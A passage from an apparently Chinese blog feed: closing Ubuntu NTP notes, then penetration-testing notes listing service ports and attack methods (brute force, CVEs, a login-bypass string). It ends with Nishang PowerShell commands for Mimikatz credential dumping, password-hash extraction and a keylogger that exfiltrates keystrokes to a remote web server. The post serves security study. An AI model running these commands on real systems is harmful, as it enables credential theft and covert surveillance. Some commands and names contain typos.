/var/lib/dhcp/dhcpd.leases</span><br></pre></td></tr></table></figure></p><h2 id="NTP服务-（网络时间协议）"><a href="#NTP服务-（网络时间协议）" class="headerlink" title="NTP服务 （网络时间协议）"></a>NTP服务 （网络时间协议）</h2><blockquote><p>时间都去哪了</p></blockquote><p><img src="/ubuntu server-网络相关知识/20200308150835487_32007.png"></p><p><strong>时间表准：</strong></p><ul><li>GMT：格林威治标准时间</li><li>UTC：世界协调时间</li><li>CST：China Standard Time UT+8:00</li></ul><p><img src="/ubuntu server-网络相关知识/20200308153026228_153.png"></p><h4 id="NTP协议"><a href="#NTP协议" class="headerlink" title="NTP协议"></a>NTP协议</h4><p><img src="/ubuntu server-网络相关知识/20200308154004613_29225.png"></p><h6 id="NTP客户端"><a href="#NTP客户端" class="headerlink" title="NTP客户端"></a>NTP客户端</h6><ul><li>客户端程序从时间服务器同步时间</li><li>系统启动时自动同步时间</li><li>网口激活时自动同步运行</li><li>手动同步时间</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新版系统，查看客户端时间</span></span><br><span class="line">timedatectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># RTC时间：硬件时间</span></span><br></pre></td></tr></table></figure><p>新版系统使用<code>timesyncd</code>客户端同步时间<br>向这个域名请求：ntp.ubuntu.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">timedatectrl list-timezones   <span class="comment">#列出所有时区</span></span><br><span class="line">timedatectrl <span class="built_in">set</span>-timezone    <span class="comment">#设置时区</span></span><br><span class="line">timedatectrl <span class="built_in">set</span>-time <span class="string">"2019-10-01 18:18:18"</span> <span class="comment">#设置系统时间</span></span><br><span class="line"></span><br><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span>  <span class="comment">#开始网络同步</span></span><br><span class="line">systemctl status systemd-timesyncd.service  <span class="comment"># 查看时间服务状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 硬件时间(RTC)与UTC时间同步</span></span><br><span class="line">sudo hwclock -w   <span class="comment"># 将系统时间写入到RTC时间</span></span><br><span class="line">sudo hwlock -s     <span class="comment"># 将硬件</span></span><br><span class="line">hwclock --<span class="built_in">set</span> --date=<span class="string">'2019-10-01 18:18:18'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/systemd/timesyncd.conf</span><br></pre></td></tr></table></figure><h6 id="一个过时的东西-ntpdate"><a href="#一个过时的东西-ntpdate" class="headerlink" title="一个过时的东西(ntpdate)"></a>一个过时的东西(ntpdate)</h6><p><img src="/ubuntu server-网络相关知识/20200308170606501_6440.png"><br>新版本系统使用<code>timesyncd</code>替换<code>ntpd</code>的客户端功能<br>一旦安装了ntpdate / ntp,   timedatectrl将被禁用</p><h6 id="ntpd-–-客户端-服务器"><a href="#ntpd-–-客户端-服务器" class="headerlink" title="ntpd – 客户端+服务器"></a>ntpd – 客户端+服务器</h6><blockquote><p>把机器设置成时间服务器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt install ntp  <span class="comment"># 安装ntp服务</span></span><br><span class="line">systemctl start ntp  <span class="comment"># 启动服务(123端口就被打开了)</span></span><br><span class="line">systemctl status ntp  <span class="comment"># 查询服务状态</span></span><br><span class="line">systemctl restart ntp  <span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##配置文件（我也要跟上一级的时间服务器同步）</span></span><br><span class="line">vim /etc/ntp.conf</span><br><span class="line"><span class="comment">#如果不使用官方的时间服务器，可以自己指定</span></span><br><span class="line">server 1.1.1.1</span><br><span class="line"><span class="comment">#首选网络时间服务器不可用的时候，使用本机始终作为备用时间源</span></span><br><span class="line">fudge 127.127.1.1 startum 10  <span class="comment"># 层级设置低点( startum 10, 这里设置为10层)</span></span><br></pre></td></tr></table></figure></p></blockquote><p>配置文件中，主要的时间服务器如下<br><img src="/ubuntu server-网络相关知识/20200308171832987_9157.png"></p><h6 id="命令-ntpq-–-ntp服务端的查询命令"><a href="#命令-ntpq-–-ntp服务端的查询命令" class="headerlink" title="命令: ntpq – ntp服务端的查询命令"></a>命令: ntpq – ntp服务端的查询命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntpq -p   </span><br><span class="line"><span class="comment">#命令执行结果详解如下图：</span></span><br></pre></td></tr></table></figure><p><img src="/ubuntu server-网络相关知识/20200308172254102_12604.png"><br>每行前面第一个字符含义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空  表示无效主机</span><br><span class="line">x   已不再使用</span><br><span class="line">-   已不再使用</span><br><span class="line">#   状态良好但为使用</span><br><span class="line">+   良好且优先使用</span><br><span class="line">*   首选主同步主机    （一般是startum层级最高的）</span><br></pre></td></tr></table></figure><h6 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看日期</span></span><br><span class="line">date</span><br><span class="line"><span class="comment">#设置</span></span><br><span class="line">date --<span class="built_in">set</span> 1998-11-11  <span class="comment">#手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp）</span></span><br><span class="line">date --<span class="built_in">set</span> 21:21:21    <span class="comment">#设置时间</span></span><br><span class="line"></span><br><span class="line">cat /etc/timezone      <span class="comment">#查看时区</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网络原理&quot;&gt;&lt;a href=&quot;#网络原理&quot; class=&quot;headerlink&quot; title=&quot;网络原理&quot;&gt;&lt;/a&gt;网络原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/ubuntu server-网络相关知识/20200214100233476_240785919.pn
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="http://www.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://www.xpshuai.cn/内网渗透/</id>
    <published>2020-03-05T04:23:24.000Z</published>
    <updated>2020-03-05T05:19:50.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网分类："><a href="#内网分类：" class="headerlink" title="内网分类："></a>内网分类：</h1><ul><li><p>带域环境的内网</p></li><li><p>不带域环境的内网</p></li></ul><h1 id="一些端口"><a href="#一些端口" class="headerlink" title="一些端口"></a>一些端口</h1><h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><blockquote><p>比如学校机房有专门用来下载文件的服务器</p></blockquote><h4 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h4><p><strong>FTP服务：</strong> ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；<br><strong>默认端口：</strong>20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><h6 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块；</li><li>匿名访问：用户名：anonymous 密码：为空或任意邮箱</li></ul><h4 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h4><p><strong>Samba服务：</strong>对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。<br>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p><h6 id="攻击方式：-1"><a href="#攻击方式：-1" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P</li><li>PassFile IP smb</li><li>未授权访问：给予public用户高权限</li><li>远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等</li></ul><h4 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h4><p><strong>ldap：</strong>轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。<br>默认端口：389</p><h6 id="攻击方式：-2"><a href="#攻击方式：-2" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>注入攻击盲注 </li><li>未授权访问</li><li>爆破：弱口令</li></ul><h3 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h3><h4 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h4><p><strong>SSH服务：</strong>  这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。<br><strong>默认端口：</strong>    22</p><h6 id="攻击方式：-3"><a href="#攻击方式：-3" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：</li><li>弱口令</li><li>漏洞：28退格漏洞、OpenSSL漏洞</li></ul><h4 id="Telent服务"><a href="#Telent服务" class="headerlink" title="Telent服务"></a>Telent服务</h4><p><strong>Telnet服务：</strong>在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；<br><strong>默认端口：</strong>  23</p><h6 id="攻击方式：-4"><a href="#攻击方式：-4" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>嗅探：此种情况一般发生在局域网</li></ul><h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><p><strong>远程桌面连接：</strong>作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；<br><strong>默认端口：</strong>  3389</p><h6 id="攻击方式：-5"><a href="#攻击方式：-5" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块)</li><li>Shift粘滞键后门：5次shift后门</li><li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_…，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids）</li></ul><h4 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h4><p><strong>VNC服务:</strong>    一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也<br><strong>默认端口：</strong>5900+桌面ID（5901；5902）</p><h6 id="攻击方式：-6"><a href="#攻击方式：-6" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>认证口令绕过：</li><li>拒绝服务攻击：（CVE-2015-5239）</li><li>权限提升：（CVE-2013-6886）</li></ul><h4 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h4><p>… … </p><h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><h4 id="1-中间件平台渗透"><a href="#1-中间件平台渗透" class="headerlink" title="1.中间件平台渗透"></a>1.中间件平台渗透</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IIS Apache Nginx Weblogic tomcat Jboos Websphere等</span><br><span class="line"># 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF`</span><br></pre></td></tr></table></figure><h4 id="2-WEB应用程序渗透"><a href="#2-WEB应用程序渗透" class="headerlink" title="2.WEB应用程序渗透"></a>2.WEB应用程序渗透</h4><ul><li><p>已知CMS </p></li><li><p>未知CMS </p></li><li><p>常规漏洞测试</p></li></ul><h3 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h3><p>针对所有的    数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p><h4 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h4><p><strong>默认端口：</strong> 3306</p><h6 id="攻击方式：-7"><a href="#攻击方式：-7" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>身份认证漏洞：CVE-2012-2122</li><li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li><li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</li></ul><h4 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h4><p><strong>默认端口：</strong>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p><h6 id="攻击方式：-8"><a href="#攻击方式：-8" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li></ul><h4 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h4><p><strong>默认端口：</strong>1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p><h6 id="攻击方式：-9"><a href="#攻击方式：-9" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>漏洞攻击</li></ul><h4 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h4><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br><strong>默认端口：</strong> 5432</p><h6 id="攻击方式：-10"><a href="#攻击方式：-10" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破弱口令：postgres postgres</li><li>缓冲区溢出：CVE-2014-2669</li></ul><h4 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h4><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考<br><strong>默认端口：</strong>  27017</p><h6 id="攻击方式：-11"><a href="#攻击方式：-11" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令 </p></li><li><p>未授权访问</p></li></ul><h4 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h4><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><p>Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547<br><strong>默认端口：</strong>  6379</p><h6 id="攻击方式：-12"><a href="#攻击方式：-12" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令 </p></li><li><p>未授权访问+配合ssh key提权</p></li></ul><h4 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h4><p><strong>默认端口：</strong>服务端口5000；监听端口4100；备份端口：4200</p><h6 id="攻击方式：-13"><a href="#攻击方式：-13" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：</li><li>弱口令;</li><li>命令注入</li></ul><h4 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h4><p><strong>默认端口：</strong>5000</p><h6 id="攻击方式：-14"><a href="#攻击方式：-14" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li></ul><p><strong>总结一下：</strong>对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p><h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h4 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h4><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！<br><strong>默认端口：</strong>  25（smtp）、465（smtps）</p><h6 id="攻击方式：-15"><a href="#攻击方式：-15" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破：弱口令</p></li><li><p>未授权访问</p></li></ul><h4 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h4><p><strong>默认端口：</strong> 109（POP2）、110（POP3）、995（POP3S）</p><h6 id="攻击方式：-16"><a href="#攻击方式：-16" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令</p></li><li><p>未授权访问</p></li></ul><h4 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h4><p><strong>默认端口：</strong>143（imap）、993（imaps）</p><h6 id="攻击方式：-17"><a href="#攻击方式：-17" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破：弱口令</p></li><li><p>配置不当</p></li></ul><h3 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h3><h4 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h4><p><strong>默认端口：</strong> 53</p><h6 id="攻击方式：-18"><a href="#攻击方式：-18" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>区域传输漏洞</li></ul><h4 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h4><p><strong>默认端口：</strong>67&amp;68、546（DHCP Failover做双机热备的）</p><h6 id="攻击方式：-19"><a href="#攻击方式：-19" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>DHCP劫持</li></ul><h4 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h4><p><strong>默认端口：</strong> 161<br>攻击方式:</p><ul><li>爆破弱口令</li></ul><hr><h1 id="Powershell框架"><a href="#Powershell框架" class="headerlink" title="Powershell框架"></a>Powershell框架</h1><blockquote><p>推荐使用 NiShang</p></blockquote><blockquote><p>参考文章：<a href="https://www.4hou.com/posts/E99ml" target="_blank" rel="noopener">https://www.4hou.com/posts/E99ml</a></p></blockquote><blockquote><p>下载地址: <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p></blockquote><blockquote><p>各种命令解析： <a href="https://www.explainshell.com" target="_blank" rel="noopener">https://www.explainshell.com</a></p></blockquote><h4 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h4><p>nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级）</p><ul><li>powershell ISE是一个编译器</li><li>powershell有很多渗透框架：</li><li>PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异</li></ul><blockquote><p>实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要</p></blockquote><h4 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h4><p><img src="/内网渗透/目录.png"></p><h4 id="模块和功能介绍："><a href="#模块和功能介绍：" class="headerlink" title="模块和功能介绍："></a>模块和功能介绍：</h4><p><img src="/内网渗透/功能.png"></p><h4 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h4><p>端口扫描 密码获取 键盘记录 反弹会话 口令爆破</p><h4 id="实战应用："><a href="#实战应用：" class="headerlink" title="实战应用："></a>实战应用：</h4><ul><li>后续控制</li><li>域渗透</li><li>系统提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"># 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）</span><br><span class="line"></span><br><span class="line">Import-Module .nishang.psml</span><br><span class="line"></span><br><span class="line"># 载入模块  查看NiShang都有哪些模块</span><br><span class="line"></span><br><span class="line">Get-Command -Moudle nishang</span><br><span class="line"></span><br><span class="line">## 查看机器基本信息</span><br><span class="line"></span><br><span class="line">Get-Information</span><br><span class="line"></span><br><span class="line"># 把结果导出文件  Out-File</span><br><span class="line"></span><br><span class="line">Get-Information | Out-File res.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测是否为虚拟机</span><br><span class="line"></span><br><span class="line">Check-VM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 获取密码</span><br><span class="line"></span><br><span class="line">Invoke-Minikatz</span><br><span class="line">#Dump出本机的凭证信息</span><br><span class="line">Invoke-Minikatz -DumpCerts</span><br><span class="line">#dump出远程的两台计算机的凭证信息</span><br><span class="line">Invoke-Minikatz -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)</span><br><span class="line">#在远程的一台机器上运行Mimikatz 并执行 &quot;privilege::debug exit&quot;</span><br><span class="line">Invoke-Minikatz -Command &quot;privilege::debug exit&quot; -ComputerName@(&quot;computer1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Get-PassHashes 获取密码</span><br><span class="line"></span><br><span class="line"># 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）</span><br><span class="line"></span><br><span class="line">Get-PassHashes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率</span><br><span class="line"></span><br><span class="line">Get-PassHints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 获取帮助参数  Get-Help</span><br><span class="line"></span><br><span class="line">Get-Help Invoke-PortScan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 端口扫描</span><br><span class="line"></span><br><span class="line">查看帮助信息</span><br><span class="line">Get-Help Invoke-PortScan -full</span><br><span class="line">Invoke-PortScan</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cd 切换到对应目录</span><br><span class="line"></span><br><span class="line">## 测试键盘记录:  </span><br><span class="line"></span><br><span class="line">Get-Help .\Keylogger.ps1 --full   # 查看帮助（提供了四种方式记录）</span><br><span class="line">#-URL 要把记录发Keylogger送到的置顶的远程服务器    ,    -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录</span><br><span class="line">.\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php </span><br><span class="line"></span><br><span class="line"># 解释： 将记录指定发送给一个可以记录Post请求的Web服务器</span><br><span class="line"></span><br><span class="line"># 默认保存到(内容是ascii码)： Windows/Temp/key.log</span><br><span class="line"></span><br><span class="line"># 把ascii记录解析为非ascii：</span><br><span class="line"></span><br><span class="line">Parse_Keys .\key.log .\parsed.txt</span><br><span class="line"></span><br><span class="line"># 